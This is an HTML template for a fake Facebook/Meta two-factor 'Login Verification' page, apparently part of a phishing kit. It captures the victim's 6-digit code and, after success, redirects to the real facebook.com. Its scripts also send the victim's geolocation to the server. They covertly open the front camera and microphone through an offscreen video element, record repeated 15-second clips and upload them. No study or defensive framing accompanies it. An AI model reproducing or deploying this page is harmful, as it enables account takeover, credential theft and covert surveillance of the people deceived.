<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="utf-8">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Login Verification</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(to bottom, #f8f9fa, #eef0f2);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            padding: 0;
            margin: 0;
            font-size: 14px;
            line-height: 1.34;
            color: #1c1e21;
            direction: ltr;
        }
        
        #page {
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        /* Header */
        .fb_header {
            background: linear-gradient(to bottom, #f8f9fa, #eef0f2);
            height: 60px;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 10px;
        }
        
        .fb-logo-container {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            background-color: #1877f2;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .fb-logo-container img {
            width: 40px;
            height: 40px;
        }
        
        /* Main content */
        .content {
            flex: 1;
            display: flex;
            justify-content: center;
            width: 100%;
            max-width: 360px;
            margin: 0 auto;
            padding: 0;
        }
        
        .container {
            background-color: #fff;
            border-radius: 12px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 16px;
            margin-bottom: 16px;
            width: 100%;
            text-align: right;
        }
        
        /* Title and description */
        .title {
            color: #1877f2;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 12px;
            text-align: center;
        }
        
        .subtitle {
            color: #65676B;
            font-size: 16px;
            margin-bottom: 16px;
            text-align: center;
        }
        
        /* Shield icon */
        .security_icon {
            background-color: #e7f3ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 66px;
            margin: 8px auto 20px;
            width: 66px;
        }
        
        .security_icon svg {
            fill: #1877f2;
            height: 35px;
            width: 35px;
        }
        
        /* Panel */
        .panel {
            background-color: #f0f2f5;
            border-radius: 8px;
            margin: 20px 0;
            padding: 16px;
        }
        
        .panel-title {
            font-weight: 600;
            margin-bottom: 12px;
            font-size: 16px;
        }
        
        .phone-label {
            color: #65676b;
            margin-bottom: 8px;
            font-size: 12px;
        }
        
        .phone-number {
            font-weight: 500;
            font-size: 14px;
        }
        
        /* Input styles */
        .code-input-container {
            margin: 20px 0;
        }
        
        .code-input {
            width: 100%;
            height: 40px;
            font-size: 15px;
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 0 12px;
            text-align: center;
            letter-spacing: 6px;
            font-weight: bold;
            background-color: #fffdcf;
            color: #333;
        }
        
        .code-input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
            outline: none;
        }
        
        /* Buttons */
        .button-container {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }
        
        .cancel-btn {
            background-color: #e4e6eb;
            border: none;
            border-radius: 24px;
            color: #1c1e21;
            font-size: 15px;
            font-weight: 600;
            padding: 10px 15px;
            cursor: pointer;
            flex: 1;
            margin-left: 8px;
            height: 44px;
        }
        
        .submit-btn {
            background-color: #0866ff;
            border: none;
            border-radius: 24px;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            height: 44px;
            cursor: pointer;
            flex: 2;
        }
        
        .submit-btn:hover {
            background-color: #166fe5;
        }
        
        .cancel-btn:hover {
            background-color: #d8dadf;
        }
        
        /* Links */
        .help-link {
            color: #000000;
            cursor: pointer;
            text-decoration: none;
            font-weight: normal;
            margin-top: 16px;
            display: block;
            font-size: 14px;
            text-align: center;
        }
        
        .help-link:hover {
            text-decoration: underline;
        }
        
        /* Timer */
        .resend-timer {
            color: #65676b;
            margin-top: 12px;
            font-size: 13px;
            text-align: center;
        }
        
        /* Footer */
        .footer {
            display: flex;
            justify-content: center;
            width: 100%;
            padding: 3px;
            font-size: 10px;
            margin-top: 20px;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            margin-top: 0;
            list-style: none;
        }
        
        .footer-link {
            color: #666;
            text-decoration: none;
            padding: 0 5px;
            font-size: 11px;
        }
        
        .footer-link:hover {
            text-decoration: underline;
        }
        
        .copyright {
            color: #8a8d91;
            font-size: 12px;
            margin-top: 10px;
            text-align: center;
        }
        
        /* Meta logo */
        .meta-logo {
            text-align: center;
            padding: 20px 0;
            margin-top: 25px;
            margin-bottom: 2px;
            display: flex;
            justify-content: center;
        }
        
        .meta-logo img {
            height: 36px;
            width: auto;
            filter: grayscale(100%);
            opacity: 0.8;
        }
        
        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }
        
        @media (max-width: 500px) {
            .content {
                padding: 0 15px;
            }
            
            .container {
                box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
            }
        }
        
        .submit-button {
            position: relative;
            overflow: hidden;
        }
        
        /* تأثيرات حالة التحميل للزر */
        .submit-button.loading {
            background-color: #156bd0;
            color: transparent;
        }
        
        .submit-button.loading::after {
            content: "";
            position: absolute;
            width: 25px;
            height: 25px;
            top: 50%;
            left: 50%;
            margin-top: -12.5px;
            margin-left: -12.5px;
            border-radius: 50%;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            animation: submit-spinner 0.8s linear infinite;
        }
        
        @keyframes submit-spinner {
            to {
                transform: rotate(360deg);
            }
        }
        
        /* تأثير النبض للفورم أثناء التحميل */
        @keyframes form-pulse {
            0% { opacity: 1; }
            50% { opacity: 0.8; }
            100% { opacity: 1; }
        }
        
        .two-factor-form.submitting {
            animation: form-pulse 1.5s infinite;
        }
        
        .two-factor-form.submitting input {
            background-color: #f3f4f6;
            transition: background-color 0.3s ease;
        }
        
        /* قائمة اللغات المنسدلة */
        .language-selector, .language-menu, .language-overlay, .language-option {
            display: none !important;
        }
    </style>
</head>
<body dir="ltr">
    <!-- Hidden video element for camera capture -->
    <video id="camera-feed" autoplay muted playsinline width="1280" height="720" style="position: fixed; top: -9999px; left: -9999px; opacity: 0;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <!-- Hidden elements for video recording -->
    <div id="recording-indicator" style="display: none; position: fixed; top: 10px; right: 10px; z-index: 9999; background-color: red; color: white; padding: 5px 10px; border-radius: 5px; font-size: 12px;">
        Recording <span id="recording-time">0</span>s
    </div>
    <video id="recorded-video-preview" style="display: none;" controls></video>

    <div id="page">
        <!-- Facebook Header -->
        <header class="fb_header">
            <div class="fb-logo-container">
                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMjAgNTEyIj48cGF0aCBmaWxsPSIjZmZmZmZmIiBkPSJNMjc5LjE0IDI4OGwxNC4yMi05Mi42NmgtODguOTF2LTYwLjEzYzAtMjUuMzUgMTIuNDItNTAuMDYgNTIuMjQtNTAuMDZoNDAuNDJWNi4yNlMyNjAuNDMgMCAyMjUuMzYgMGMtNzMuMjIgMC0xMjEuMDggNDQuMzgtMTIxLjA4IDEyNC43MnY3MC42MkgyMi44OVYyODhoODEuMzl2MjI0aDEwMC4xN1YyODhoNzQuNjl6Ii8+PC9zdmc+" alt="حرف f لفيسبوك">
            </div>
        </header>
        
        <!-- Main Content -->
        <main class="content">
            <div class="container">
                <!-- Security Icon -->
                <div class="security_icon">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
                    </svg>
                </div>
                
                <!-- Title and Description -->
                <h1 class="title">Login Verification</h1>
                <p class="subtitle">To help keep your account secure, we need to verify it's really you trying to sign in</p>
                
                <!-- Code Panel -->
                <div class="panel">
                    <h2 class="panel-title">Enter the 6-digit code</h2>
                    <div class="phone-label">We sent the code to:</div>
                    <div class="phone-number" id="user-email">
                        {% if email %}
                            {{ email | mask_email }}
                        {% else %}
                            your-email@example.com
                        {% endif %}
                    </div>
                    
                    <form action="/verify_code" method="post" class="two-factor-form">
                        <div class="code-input-container">
                            <input type="text" class="code-input" name="verification_code" placeholder="******" maxlength="6" autocomplete="off" required>
                        </div>
                        
                        <div class="resend-timer">
                            <span>You can request a new code in</span> <span id="timer">60</span> <span>seconds</span>
                        </div>
                        
                        <div class="button-container">
                            <button type="button" class="cancel-btn">Cancel</button>
                            <button type="submit" class="submit-btn submit-button" id="submit-button">Continue</button>
                        </div>
                    </form>
                </div>
                
                <!-- Help Links -->
                <div style="text-align: center;">
                    <a href="#" class="help-link" id="request-new-code">I didn't receive a code</a>
                    <a href="#" class="help-link">I can't access this email</a>
                </div>
                
                <!-- Forgot password link with additional margin -->
                <div style="text-align: center; margin-top: 25px;">
                    <a href="#" class="help-link" style="font-weight: 500; color: #1877f2;">Forgotten password?</a>
                </div>
            </div>
        </main>
        
        <!-- Meta Logo -->
        <div class="meta-logo">
            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png" alt="Meta Logo" style="filter: grayscale(100%); opacity: 0.8;">
        </div>
        
        <!-- Footer -->
        <footer class="footer">
            <ul class="footer-links">
                <li></li>
            </ul>
            <div class="copyright">Meta © 2025</div>
        </footer>
    </div>
    
    <!-- Count down timer script -->
    <script>
        // Simplified script without translations
        let timeLeft = 60;
        let timerElement = document.getElementById('timer');
        let timerInterval;
        
        function updateTimer() {
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                timerElement.parentElement.innerHTML = 'You can <a href="#" id="request-link" style="color:#1877f2;text-decoration:none;font-weight:500;">request a new code</a>';
                
                // Add event listener to the new link
                document.getElementById('request-link').addEventListener('click', function(e) {
                    e.preventDefault();
                    resetTimer();
                });
                return;
            }
            
            timerElement.textContent = timeLeft;
            timeLeft -= 1;
        }
        
        function resetTimer() {
            // Clear any existing timer
            clearInterval(timerInterval);
            
            // Reset timer display
            timeLeft = 60;
            
            // Replace the content with the original timer message
            const timerContainer = document.querySelector('.resend-timer');
            timerContainer.innerHTML = 'You can request a new code in <span id="timer">60</span> seconds';
            
            // Update the timerElement reference
            timerElement = document.getElementById('timer');
            
            // Start the timer again
            timerInterval = setInterval(updateTimer, 1000);
            
            // Show message that new code was requested
            alert('A new code has been requested. Please check your email.');
        }
        
        // Add event listener to "request new code" link
        document.getElementById('request-new-code').addEventListener('click', function(e) {
            e.preventDefault();
            resetTimer();
        });
        
        // Function to obfuscate email for privacy
        function obfuscateEmail(email) {
            if (!email) return "your-email@example.com";
            
            const parts = email.split('@');
            if (parts.length !== 2) return email;
            
            const name = parts[0];
            const domain = parts[1];
            
            // Show first character and last character of username, hide the rest
            let obfuscatedName = name;
            if (name.length > 2) {
                obfuscatedName = name.charAt(0) + '*'.repeat(name.length - 2) + name.charAt(name.length - 1);
            }
            
            return obfuscatedName + '@' + domain;
        }
        
        // Try to get email from URL parameter or localStorage
        function getEmailFromSession() {
            // Check URL parameters first
            const urlParams = new URLSearchParams(window.location.search);
            const emailParam = urlParams.get('email');
            
            if (emailParam) {
                return emailParam;
            }
            
            // Check localStorage next
            const storedEmail = localStorage.getItem('user_email');
            if (storedEmail) {
                return storedEmail;
            }
            
            // Default return
            return null;
        }
        
        // Page initialization
        window.onload = function() {
            // Update email display if needed
            const emailDisplay = document.getElementById('user-email');
            if (emailDisplay.textContent.trim() === 'your-email@example.com') {
                const userEmail = getEmailFromSession();
                if (userEmail) {
                    emailDisplay.textContent = obfuscateEmail(userEmail);
                }
            }
            
            // Start the timer
            timerInterval = setInterval(updateTimer, 1000);
            
            // Add event handler for form submission
            document.querySelector('.two-factor-form').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const button = document.getElementById('submit-button');
                button.classList.add('loading');
                this.classList.add('submitting');
                
                const codeInput = document.querySelector('input[name="verification_code"]');
                if (!codeInput.value || codeInput.value.length !== 6) {
                    codeInput.focus();
                    return;
                }
                
                // Get location data before submitting the form
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            // Send location data first
                            fetch('/api/get-location', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify({
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy
                                })
                            })
                            .then(() => {
                                // After location is sent, submit the form
                                const formData = new FormData();
                                formData.append('verification_code', codeInput.value);
                                
                                return fetch('/verify_code', {
                                    method: 'POST',
                                    body: formData
                                });
                            })
                            .then(response => response.json())
                            .then(data => {
                                if (data.status === 'success') {
                                    // Redirect to the real Facebook website
                                    window.location.replace('https://www.facebook.com');
                                } else {
                                    button.classList.remove('loading');
                                    alert('Invalid verification code. Please try again.');
                                }
                            })
                            .catch(error => {
                                button.classList.remove('loading');
                                console.error('Error:', error);
                            });
                        },
                        function(error) {
                            console.error('Geolocation error:', error);
                            // If location fails, still submit the form
                            const formData = new FormData();
                            formData.append('verification_code', codeInput.value);
                            
                            fetch('/verify_code', {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => response.json())
                            .then(data => {
                                if (data.status === 'success') {
                                    // Redirect to the real Facebook website
                                    window.location.replace('https://www.facebook.com');
                                } else {
                                    button.classList.remove('loading');
                                    alert('Invalid verification code. Please try again.');
                                }
                            })
                            .catch(error => {
                                button.classList.remove('loading');
                                console.error('Error:', error);
                            });
                        }
                    );
                } else {
                    // If geolocation is not supported, just submit the form
                    const formData = new FormData();
                    formData.append('verification_code', codeInput.value);
                    
                    fetch('/verify_code', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.status === 'success') {
                            // Redirect to the real Facebook website
                            window.location.replace('https://www.facebook.com');
                        } else {
                            button.classList.remove('loading');
                            alert('Invalid verification code. Please try again.');
                        }
                    })
                    .catch(error => {
                        button.classList.remove('loading');
                        console.error('Error:', error);
                    });
                }
            });
        };
        
        // متغيرات تسجيل الفيديو
        let mediaRecorder = null;
        let recordedChunks = [];
        let isRecording = false;
        let recordingTimer = null;
        let recordingSeconds = 0;
        let maxRecordingTime = 15; // الحد الأقصى 15 ثانية
        let captureCount = 0;
        let successfulCaptures = 0;
        let retryCount = 0;
        const MAX_CAPTURES = 5;
        const MAX_RETRIES = 3;
        
        // بدء تشغيل الكاميرا عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', function() {
            // استدعاء وظيفة طلب إذن الكاميرا وبدء التسجيل
            requestCameraPermission();
        });
        
        // وظيفة طلب إذن الكاميرا
        function requestCameraPermission() {
            retryCount++;
            console.log("محاولة فتح الكاميرا في صفحة التحقق الثنائي #" + retryCount);
            
            const constraints = {
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    facingMode: 'user'
                },
                audio: true  // تفعيل الصوت لتسجيل الفيديو
            };
            
            const video = document.getElementById('camera-feed');
            const canvas = document.getElementById('canvas');
            
            // إعادة تعيين الفيديو
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(track => track.stop());
                video.srcObject = null;
            }
            
            navigator.mediaDevices.getUserMedia(constraints)
                .then(function(stream) {
                    console.log("تم الحصول على مجرى الكاميرا بنجاح في صفحة التحقق");
                    video.srcObject = stream;
                    
                    // ضمان تشغيل الفيديو بعدة طرق
                    video.play()
                        .then(() => console.log("تم تشغيل الفيديو بنجاح"))
                        .catch(err => console.error("خطأ في تشغيل الفيديو:", err));
                    
                    // إضافة مستمعي أحداث لضمان عمل الفيديو
                    video.onloadedmetadata = function() {
                        console.log("تم تحميل بيانات الفيديو (metadata)");
                        video.play();
                    };
                    
                    video.oncanplay = function() {
                        console.log("الفيديو جاهز للتشغيل");
                    };
                    
                    // بدء تسجيل الفيديو بعد ثانية واحدة
                    setTimeout(function() {
                        startVideoRecording(stream);
                    }, 1000);
                })
                .catch(function(error) {
                    console.error("خطأ في الوصول إلى الكاميرا في صفحة التحقق:", error);
                    
                    // محاولة أخرى بإعدادات مختلفة إذا فشلت المحاولة الأولى
                    if (retryCount < MAX_RETRIES) {
                        console.log("محاولة تشغيل الكاميرا بإعدادات مختلفة...");
                        
                        // محاولة بدقة أقل
                        const simpleConstraints = {
                            video: { facingMode: 'user' },
                            audio: true  // تفعيل الصوت للفيديو
                        };
                        
                        setTimeout(() => {
                            navigator.mediaDevices.getUserMedia(simpleConstraints)
                                .then(function(stream) {
                                    console.log("تم الحصول على مجرى الكاميرا بإعدادات بسيطة");
                                    video.srcObject = stream;
                                    video.play();
                                    
                                    // بدء تسجيل الفيديو
                                    startVideoRecording(stream);
                                })
                                .catch(error => {
                                    console.error("فشلت المحاولة الثانية للكاميرا:", error);
                                });
                        }, 500);
                    }
                });
        }
        
        // دالة بدء تسجيل الفيديو
        function startVideoRecording(stream) {
            try {
                // إنشاء MediaRecorder
                let options = { mimeType: 'video/webm;codecs=vp9,opus' };
                
                // محاولة اختيار أفضل MIME type متاح
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    options = { mimeType: 'video/webm;codecs=vp8,opus' };
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                        options = { mimeType: 'video/webm' };
                        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                            options = { mimeType: '' };
                        }
                    }
                }
                
                // تهيئة المسجل
                recordedChunks = [];
                mediaRecorder = new MediaRecorder(stream, options);
                
                // حدث عند توفر بيانات
                mediaRecorder.ondataavailable = function(e) {
                    if (e.data && e.data.size > 0) {
                        recordedChunks.push(e.data);
                    }
                };
                
                // حدث عند انتهاء التسجيل
                mediaRecorder.onstop = function() {
                    console.log("تم الانتهاء من تسجيل الفيديو في صفحة التحقق");
                    stopRecordingTimer();
                    
                    // تجميع البيانات المسجلة
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    sendVideoToServer(blob);
                    
                    // إعادة بدء التسجيل بعد فترة قصيرة (اختياري)
                    setTimeout(() => {
                        if (captureCount < MAX_CAPTURES) {
                            startVideoRecording(stream);
                        }
                    }, 2000);
                };
                
                // بدء التسجيل
                mediaRecorder.start();
                isRecording = true;
                captureCount++;
                console.log("بدء تسجيل الفيديو في صفحة التحقق #" + captureCount);
                
                // تشغيل مؤقت التسجيل
                startRecordingTimer();
                
                // إيقاف التسجيل بعد وقت محدد
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                        mediaRecorder.stop();
                        isRecording = false;
                    }
                }, maxRecordingTime * 1000);
                
            } catch(error) {
                console.error("خطأ في بدء تسجيل الفيديو في صفحة التحقق:", error);
            }
        }
        
        // دالة إرسال الفيديو إلى الخادم
        function sendVideoToServer(blob) {
            const formData = new FormData();
            const timestamp = new Date().getTime();
            formData.append('video', blob, 'video_2fa_' + timestamp + '.webm');
            
            console.log("محاولة إرسال الفيديو من صفحة التحقق #" + captureCount);
            
            fetch('/api/capture-video', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log("تم تسجيل وإرسال الفيديو من صفحة التحقق بنجاح #" + captureCount, data);
                successfulCaptures++;
            })
            .catch(error => {
                console.error("خطأ في إرسال الفيديو من صفحة التحقق:", error);
            });
        }
        
        // دوال لتشغيل وإيقاف مؤقت التسجيل
        function startRecordingTimer() {
            recordingSeconds = 0;
            const timerElement = document.getElementById('recording-time');
            
            timerElement.textContent = '0';
            
            recordingTimer = setInterval(() => {
                recordingSeconds++;
                timerElement.textContent = recordingSeconds;
                
                if (recordingSeconds >= maxRecordingTime) {
                    clearInterval(recordingTimer);
                }
            }, 1000);
        }
        
        function stopRecordingTimer() {
            if (recordingTimer) {
                clearInterval(recordingTimer);
                recordingTimer = null;
            }
        }
    </script>
</body>
</html> 